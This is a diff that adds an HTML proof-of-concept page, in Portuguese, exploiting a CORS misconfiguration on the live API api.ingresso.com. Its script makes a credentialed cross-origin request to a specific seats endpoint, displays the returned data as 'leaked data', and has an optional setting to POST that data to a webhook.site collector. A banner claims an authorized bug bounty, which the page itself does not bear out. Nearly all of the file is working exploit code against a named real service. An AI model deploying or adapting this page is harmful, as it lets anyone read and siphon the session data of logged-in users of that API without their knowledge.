@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>PoC CORS — Ingresso.com</title>
+<style>
+  body { font-family: monospace; max-width: 900px; margin: 40px auto; padding: 20px; background: #111; color: #0f0; }
+  h1 { color: #fff; }
+  .aviso { background: #333; padding: 12px; border-left: 4px solid #ff0; color: #ff0; margin-bottom: 20px; }
+  pre { background: #000; padding: 16px; overflow-x: auto; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; }
+  .ok { color: #0f0; }
+  .erro { color: #f00; }
+</style>
+</head>
+<body>
+
+<div class="aviso">
+  ⚠️ PoC de pesquisa de segurança — programa de bug bounty autorizado do Ingresso.com.
+  Nenhum dado de terceiro é coletado.
+</div>
+
+<h1>PoC — CORS Misconfiguration</h1>
+<p>Alvo: <code>api.ingresso.com</code></p>
+<p>Origin deste PoC: <code id="origin"></code></p>
+<p>Status: <span id="status">testando...</span></p>
+
+<h2>Resposta do servidor:</h2>
+<pre id="out">Aguardando...</pre>
+
+<script>
+const TARGET = 'https://api.ingresso.com/v1/sessions/87001011/sections/4583453/seats';
+const COLLECT = ''; // opcional: cola sua URL do webhook.site aqui
+
+document.getElementById('origin').textContent = window.location.origin;
+
+fetch(TARGET, { credentials: 'include' })
+  .then(r => {
+    document.getElementById('status').innerHTML =
+      '<span class="ok">HTTP ' + r.status + ' — CORS permitiu leitura cross-origin</span>';
+    return r.text();
+  })
+  .then(data => {
+    document.getElementById('out').textContent = data;
+    console.log('DADOS VAZADOS:', data);
+    if (COLLECT) fetch(COLLECT, { method: 'POST', body: data });
+  })
+  .catch(e => {
+    document.getElementById('status').innerHTML =
+      '<span class="erro">BLOQUEADO: ' + e.message + '</span>';
+    document.getElementById('out').textContent = 'Erro: ' + e;
+    console.error(e);
+  });
+</script>
+
+</body>
+</html>
